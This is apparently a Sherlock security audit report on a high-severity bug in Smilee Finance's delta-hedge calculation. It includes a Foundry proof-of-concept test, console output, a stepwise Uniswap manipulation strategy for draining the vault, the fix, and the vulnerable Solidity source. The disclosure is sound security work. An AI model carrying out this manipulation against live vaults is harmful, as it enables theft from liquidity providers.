{
  "Title": "H-1: The sign of delta hedge amount can be reversed by malicious user due to incorrect condition in `FinanceIGDelta.deltaHedgeAmount`",
  "Content": "# Issue H-1: The sign of delta hedge amount can be reversed by malicious user due to incorrect condition in `FinanceIGDelta.deltaHedgeAmount` \n\nSource: https://github.com/sherlock-audit/2024-02-smilee-finance-judging/issues/36 \n\n## Found by \npanprog\n## Summary\n\nWhen delta hedge amount is calculated after the trade, the final check is to account for sqrt computation error and ensure the exchanged amount of side token doesn't exceed amount of side tokens the vault has. The issue is that this check is incorrect: it compares absolute value of the delta hedge amount, but always sets positive amount of side tokens if the condition is true. If the delta hedge amount is negative, this final check will reverse the sign of the delta hedge amount, messing up the hedged assets the protocol has.\n\nAs a result, if the price moves significantly before the next delta hedge, protocol might not have enough funds to pay off users due to incorrect hedging. It also allows the user to manipulate underlying uniswap pool, then force the vault to delta hedge large amount at very bad price while trading tiny position of size 1 wei, without paying any fees. Repeating this process, the malicious user can drain/steal all funds from the vault in a very short time.\n\n## Vulnerability Detail\n\nThe final check in calculating delta hedge amount in `FinanceIGDelta.deltaHedgeAmount` is:\n```solidity\n    // due to sqrt computation error, sideTokens to sell may be very few more than available\n    if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n        if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n            tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n        }\n    }\n```\n\nThe logic is that if due to small computation errors, delta hedge amount (to sell side token) can slightly exceed amount of side tokens the vault has, when in reality it means to just sell all side tokens the vault has, then delta hedge amount should equal to side tokens amount vault has.\n\nThe issue here is that only positive delta hedge amount means vault has to sell side tokens, while negative amount means it has to buy side tokens. But the condition compares `abs(tokensToSwap)`, meaning that if the delta hedge amount is negative, but in absolute value very close to side tokens amount the vault has, then the condition will also be true, which will set `tokensToSwap` to a positive amount of side tokens, i.e. will reverse the delta hedge amount from `-sideTokens` to `+sideTokens`.\n\nIt's very easy for malicious user to craft such situation. For example, if current price is significantly greater than strike price, and there are no other open trades, simply buy IG bull options for 50% of the vault amount. Then buy IG bull options for another 50%. The first trade will force the vault to buy ETH for delta hedge, while the second trade will force the vault to sell the same ETH amount instead of buying it. If there are open trades, it's also easy to calculate the correct proportions of the trades to make `delta hedge amount = -side tokens`.\n\nOnce the vault incorrectly hedges after malicious user's trade, there are multiple bad scenarios which will harm the protocol. For example:\n1. If no trade happens for some time and the price increases, the protocol will have no side tokens to hedge, but the bull option buyers will still receive their payoff, leaving vault LPs in a loss, up to a situation when the vault will not have enough funds to even pay the option buyers payoff.\n2. Malicious user can abuse the vault's incorrect hedge to directly profit from it. After the trade described above, any trade, even 1 wei trade, will make vault re-hedge with the correct hedge amount, which can be a significant amount. Malicious user can abuse it by manipulating the underlying uniswap pool:\n2.1. Buy underlying uniswap pool up to the edge of allowed range (say, +1.8% of current price, average price of ETH bought = +0.9% of current price)\n2.2. Provide uniswap liquidity in that narrow range (+1.8%..+2.4%)\n2.3. Open/close any position in IG with amount = 1 wei (basically paying no fees) -> this forces the vault to delta hedge (buy) large amount of ETH at inflated price ~+2% of the current price.\n2.5. Remove uniswap liquidity.\n2.6. Sell back in the uniswap pool.\n2.7. During the delta hedge, uniswap position will buy ETH (uniswap liquidity will sell ETH) at the average price of +2.1% of the current price, also receiving pool fees. The fees for manipulating the pool and \"closing\" position via providing liquidity will cancel out and overall profit will be: +2.1% - 0.9% = +1.2% of the delta hedge amount.\n\nThe strategy can be enchanced to optimize the profitability, but the idea should be clear.\n\n## Impact\n\nMalicious user can steal all vault funds, and/or the vault LPs will incur losses higher than uniswap LPs or vault will be unable to payoff the traders due to incorrect hedged amount.\n\n## Proof Of Concept\n\nCopy to `attack.t.sol`:\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\nimport {UD60x18, ud, convert} from \"@prb/math/UD60x18.sol\";\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IPositionManager} from \"@project/interfaces/IPositionManager.sol\";\nimport {Epoch} from \"@project/lib/EpochController.sol\";\nimport {AmountsMath} from \"@project/lib/AmountsMath.sol\";\nimport {EpochFrequency} from \"@project/lib/EpochFrequency.sol\";\nimport {OptionStrategy} from \"@project/lib/OptionStrategy.sol\";\nimport {AddressProvider} from \"@project/AddressProvider.sol\";\nimport {MarketOracle} from \"@project/MarketOracle.sol\";\nimport {FeeManager} from \"@project/FeeManager.sol\";\nimport {Vault} from \"@project/Vault.sol\";\nimport {TestnetToken} from \"@project/testnet/TestnetToken.sol\";\nimport {TestnetPriceOracle} from \"@project/testnet/TestnetPriceOracle.sol\";\nimport {DVPUtils} from \"./utils/DVPUtils.sol\";\nimport {TokenUtils} from \"./utils/TokenUtils.sol\";\nimport {Utils} from \"./utils/Utils.sol\";\nimport {VaultUtils} from \"./utils/VaultUtils.sol\";\nimport {MockedIG} from \"./mock/MockedIG.sol\";\nimport {MockedRegistry} from \"./mock/MockedRegistry.sol\";\nimport {MockedVault} from \"./mock/MockedVault.sol\";\nimport {TestnetSwapAdapter} from \"@project/testnet/TestnetSwapAdapter.sol\";\nimport {PositionManager} from \"@project/periphery/PositionManager.sol\";\n\n\ncontract IGVaultTest is Test {\n    using AmountsMath for uint256;\n\n    address admin = address(0x1);\n\n    // User of Vault\n    address alice = address(0x2);\n    address bob = address(0x3);\n\n    //User of DVP\n    address charlie = address(0x4);\n    address david = address(0x5);\n\n    AddressProvider ap;\n    TestnetToken baseToken;\n    TestnetToken sideToken;\n    FeeManager feeManager;\n\n    MockedRegistry registry;\n\n    MockedVault vault;\n    MockedIG ig;\n    TestnetPriceOracle priceOracle;\n    TestnetSwapAdapter exchange;\n    uint _strike;\n\n    function setUp() public {\n        vm.warp(EpochFrequency.REF_TS);\n        //ToDo: Replace with Factory\n        vm.startPrank(admin);\n        ap = new AddressProvider(0);\n        registry = new MockedRegistry();\n        ap.grantRole(ap.ROLE_ADMIN(), admin);\n        registry.grantRole(registry.ROLE_ADMIN(), admin);\n        ap.setRegistry(address(registry));\n\n        vm.stopPrank();\n\n        vault = MockedVault(VaultUtils.createVault(EpochFrequency.DAILY, ap, admin, vm));\n        priceOracle = TestnetPriceOracle(ap.priceOracle());\n\n        baseToken = TestnetToken(vault.baseToken());\n        sideToken = TestnetToken(vault.sideToken());\n\n        vm.startPrank(admin);\n       \n        ig = new MockedIG(address(vault), address(ap));\n        ig.grantRole(ig.ROLE_ADMIN(), admin);\n        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);\n        vault.grantRole(vault.ROLE_ADMIN(), admin);\n        vm.stopPrank();\n        ig.setOptionPrice(1e3);\n        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1\n        ig.useRealDeltaHedge();\n        ig.useRealPercentage();\n        ig.useRealPremium();\n\n        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);\n\n        vm.prank(admin);\n        registry.registerDVP(address(ig));\n        vm.prank(admin);\n        MockedVault(vault).setAllowedDVP(address(ig));\n        feeManager = FeeManager(ap.feeManager());\n\n        exchange = TestnetSwapAdapter(ap.exchangeAdapter());\n    }\n\n    function testIncorrectDeltaHedge() public {\n        _strike = 1e18;\n        VaultUtils.addVaultDeposit(alice, 1e18, admin, address(vault), vm);\n        VaultUtils.addVaultDeposit(bob, 1e18, admin, address(vault), vm);\n\n        Utils.skipDay(true, vm);\n\n        vm.prank(admin);\n        ig.rollEpoch();\n\n        VaultUtils.logState(vault);\n        DVPUtils.debugState(ig);\n\n        testBuyOption(1.09e18, 0.5e18, 0);\n        testBuyOption(1.09e18, 0.5e18, 0);\n    }\n\n    function testBuyOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {\n\n        vm.prank(admin);\n        priceOracle.setTokenPrice(address(sideToken), price);\n\n        (uint256 premium, uint256 fee) = _assurePremium(charlie, _strike, optionAmountUp, optionAmountDown);\n\n        vm.startPrank(charlie);\n        premium = ig.mint(charlie, _strike, optionAmountUp, optionAmountDown, premium, 1e18, 0);\n        vm.stopPrank();\n\n        console.log(\"premium\", premium);\n        VaultUtils.logState(vault);\n    }\n\n    function testSellOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {\n        vm.prank(admin);\n        priceOracle.setTokenPrice(address(sideToken), price);\n\n        uint256 charliePayoff;\n        uint256 charliePayoffFee;\n        {\n            vm.startPrank(charlie);\n            (charliePayoff, charliePayoffFee) = ig.payoff(\n                ig.currentEpoch(),\n                _strike,\n                optionAmountUp,\n                optionAmountDown\n            );\n\n            charliePayoff = ig.burn(\n                ig.currentEpoch(),\n                charlie,\n                _strike,\n                optionAmountUp,\n                optionAmountDown,\n                charliePayoff,\n                0.1e18\n            );\n            vm.stopPrank();\n\n            console.log(\"payoff received\", charliePayoff);\n        }\n\n        VaultUtils.logState(vault);\n    }\n\n    function _assurePremium(\n        address user,\n        uint256 strike,\n        uint256 amountUp,\n        uint256 amountDown\n    ) private returns (uint256 premium_, uint256 fee) {\n        (premium_, fee) = ig.premium(strike, amountUp, amountDown);\n        TokenUtils.provideApprovedTokens(admin, address(baseToken), user, address(ig), premium_*2, vm);\n    }\n}\n```\n\nExecution console:\n```solidity\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n...\n  premium 0\n  baseToken balance 2090000000000000000\n  sideToken balance 0\n...\n  premium 25585649987654406\n  baseToken balance 1570585649987654474\n  sideToken balance 499999999999999938\n...\n  premium 25752512349788475\n  baseToken balance 2141338162337442881\n  sideToken balance 0\n...\n  premium 0\n  baseToken balance 1051338162337442949\n  sideToken balance 999999999999999938\n...\n```\n\nNotice:\n1. First trade (amount = 1 wei) settles delta-hedge at current price (1.09): sideToken = 0 because price is just above kB\n2. 2nd trade (buy ig bull amount = 0.5) causes delta-hedge of buying 0.5 side token\n3. 3rd trade (buy ig bull amount = 0.5) causes delta-hedge of **selling** 0.5 side token (instead of buying 0.5)\n4. Last trade (amount = 1 wei) causes vault to buy 1 side token for correct delta-hedge (but at 0 fee to user).\n\n## Code Snippet\n\n`FinanceIGDelta.deltaHedgeAmount` incorrect condition:\nhttps://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/FinanceIGDelta.sol#L109-L114\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe check should be done only when `tokensToSwap` is positive:\n```solidity\n        // due to sqrt computation error, sideTokens to sell may be very few more than available\n-       if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n+       if (tokensToSwap > 0 && SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n            if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n                tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n            }\n        }\n```\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/a871e4fc503df51ee9846f34363c0d94d02c83a0.\n\n**panprog**\n\nFix review: Fixed\n\n**sherlock-admin4**\n\nThe Lead Senior Watson signed off on the fix.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/180",
  "Code": [
    {
      "filename": "smilee-v2-contracts/src/lib/FinanceIGDelta.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.19;\n\nimport {SD59x18, sd, convert as convertint} from \"@prb/math/SD59x18.sol\";\nimport {UD60x18, ud, convert} from \"@prb/math/UD60x18.sol\";\nimport {AmountsMath} from \"./AmountsMath.sol\";\nimport {SignedMath} from \"./SignedMath.sol\";\n\n/// @title Implementation of core financial computations for Smilee protocol\nlibrary FinanceIGDelta {\n    /// @notice A wrapper for the input parameters of delta perc functions\n    struct Parameters {\n        // strike\n        uint256 k;\n        // lower bound liquidity range\n        uint256 kA;\n        // upper bound liquidity range\n        uint256 kB;\n        // reference price\n        uint256 s;\n        // theta factor\n        uint256 theta;\n    }\n\n    struct DeltaHedgeParameters {\n        int256 igDBull;\n        int256 igDBear;\n        uint8 baseTokenDecimals;\n        uint8 sideTokenDecimals;\n        uint256 initialLiquidityBull;\n        uint256 initialLiquidityBear;\n        uint256 availableLiquidityBull;\n        uint256 availableLiquidityBear;\n        uint256 sideTokensAmount;\n        int256 notionalUp;\n        int256 notionalDown;\n        uint256 strike;\n        uint256 theta;\n        uint256 kb;\n    }\n\n    int256 internal constant _MAX_EXP = 133_084258667509499441;\n\n    /**\n        @notice Computes unitary delta hedge quantity for bull/bear options\n        @param params The set of Parameters to compute deltas\n        @return igDBull The unitary integer quantity of side token to hedge a bull position\n        @return igDBear The unitary integer quantity of side token to hedge a bear position\n        @dev the formulas are the ones for different ranges of liquidity\n    */\n    function deltaHedgePercentages(Parameters calldata params) external pure returns (int256 igDBull, int256 igDBear) {\n        igDBull = bullDelta(params.k, params.kB, params.s, params.theta);\n        igDBear = bearDelta(params.k, params.kA, params.s, params.theta);\n    }\n\n    /**\n        @notice Gives the amount of side tokens to swap in order to hedge protocol delta exposure\n        @param params The DeltaHedgeParameters info\n        @return tokensToSwap An integer amount, positive when there are side tokens in excess (need to sell) and negative vice versa\n        @dev This is what's called `h` in the papers\n     */\n    function deltaHedgeAmount(DeltaHedgeParameters memory params) public pure returns (int256 tokensToSwap) {\n        params.initialLiquidityBull = AmountsMath.wrapDecimals(params.initialLiquidityBull, params.baseTokenDecimals);\n        params.initialLiquidityBear = AmountsMath.wrapDecimals(params.initialLiquidityBear, params.baseTokenDecimals);\n        params.availableLiquidityBull = AmountsMath.wrapDecimals(\n            params.availableLiquidityBull,\n            params.baseTokenDecimals\n        );\n        params.availableLiquidityBear = AmountsMath.wrapDecimals(\n            params.availableLiquidityBear,\n            params.baseTokenDecimals\n        );\n\n        uint256 notionalBull = AmountsMath.wrapDecimals(SignedMath.abs(params.notionalUp), params.baseTokenDecimals);\n        uint256 notionalBear = AmountsMath.wrapDecimals(SignedMath.abs(params.notionalDown), params.baseTokenDecimals);\n        params.sideTokensAmount = AmountsMath.wrapDecimals(params.sideTokensAmount, params.sideTokenDecimals);\n\n        uint256 protoNotionalBull = params.notionalUp >= 0\n            ? ud(params.availableLiquidityBull).sub(ud(notionalBull)).unwrap()\n            : ud(params.availableLiquidityBull).add(ud(notionalBull)).unwrap();\n\n        uint256 protoNotionalBear = params.notionalDown >= 0\n            ? ud(params.availableLiquidityBear).sub(ud(notionalBear)).unwrap()\n            : ud(params.availableLiquidityBear).add(ud(notionalBear)).unwrap();\n\n        uint256 protoDBull = 2 * ud(SignedMath.abs(params.igDBull))\n            .mul(ud(protoNotionalBull))\n            .unwrap();\n        uint256 protoDBear = 2 * ud(SignedMath.abs(params.igDBear))\n            .mul(ud(protoNotionalBear))\n            .unwrap();\n\n        uint256 deltaLimit;\n        {\n            UD60x18 v0 = ud(params.initialLiquidityBull + params.initialLiquidityBear);\n            UD60x18 strike = ud(params.strike);\n            UD60x18 theta = ud(params.theta);\n            UD60x18 kb = ud(params.kb);\n            // DeltaLimit := v0 / (θ * k) - v0 / (θ * √(K * Kb))\n            deltaLimit = v0.div(theta.mul(strike)).sub(v0.div(theta.mul(strike.mul(kb).sqrt()))).unwrap();\n        }\n\n        tokensToSwap =\n            SignedMath.revabs(protoDBull, params.igDBull >= 0) +\n            SignedMath.revabs(protoDBear, params.igDBear >= 0) +\n            SignedMath.castInt(params.sideTokensAmount) -\n            SignedMath.castInt(deltaLimit);\n\n        // due to sqrt computation error, sideTokens to sell may be very few more than available\n        if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n            if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n                tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n            }\n        }\n        params.sideTokensAmount = SignedMath.abs(tokensToSwap);\n        params.sideTokensAmount = AmountsMath.unwrapDecimals(params.sideTokensAmount, params.sideTokenDecimals);\n        tokensToSwap = SignedMath.revabs(params.sideTokensAmount, tokensToSwap >= 0);\n    }\n\n    ////// HELPERS //////\n\n    /**\n        Δ_bull = (1 / θ) * F\n        F = {\n            * 0                     if (S < K)\n            * (1 - √(K / Kb)) / K   if (S > Kb)\n            * 1 / K - 1 / √(S * K)  if (K < S < Kb)\n        }\n    */\n    function bullDelta(uint256 k, uint256 kB, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s <= k) {\n            return 0;\n        }\n        if (s > kB) {\n            delta = (convertint(1).sub((sd(int256(k)).div(sd(int256(kB)))).sqrt())).div(sd(int256(k)));\n        } else {\n            // if (k < s < kB)\n            delta = _inRangeDelta(k, s);\n        }\n        return delta.div(sd(int256(theta))).unwrap();\n    }\n\n    /**\n        Δ_bear = (1 / θ) * F\n        F = {\n            * (1 - √(K / Ka)) / K   if (S < Ka)\n            * 0                     if (S > K)\n            * 1 / K - 1 / √(S * K)  if (Ka < S < K)\n        }\n    */\n    function bearDelta(uint256 k, uint256 kA, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s >= k) {\n            return 0;\n        }\n        if (s < kA) {\n            delta = (convertint(1).sub((sd(int256(k)).div(sd(int256(kA)))).sqrt())).div(sd(int256(k)));\n        } else {\n            // if (kA < s < k)\n            delta = _inRangeDelta(k, s);\n        }\n        return delta.div(sd(int256(theta))).unwrap();\n    }\n\n    /// @dev (1 / K) - 1 / √(S * K)\n    function _inRangeDelta(uint256 k, uint256 s) internal pure returns (SD59x18) {\n        return (convertint(1).div(sd(int256(k)))).sub(convertint(1).div((sd(int256(s)).mul(sd(int256(k))).sqrt())));\n    }\n}"
    }
  ]
}